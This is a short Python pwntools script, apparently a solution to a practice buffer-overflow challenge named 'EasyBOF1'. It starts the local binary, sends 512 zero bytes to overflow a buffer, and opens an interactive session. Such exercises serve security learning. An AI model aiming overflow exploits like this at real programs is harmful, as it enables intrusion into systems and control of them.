from pwn import *
p = process("./prob/EasyBOF1")
p.sendline(p8(0) * 512)
p.interactive()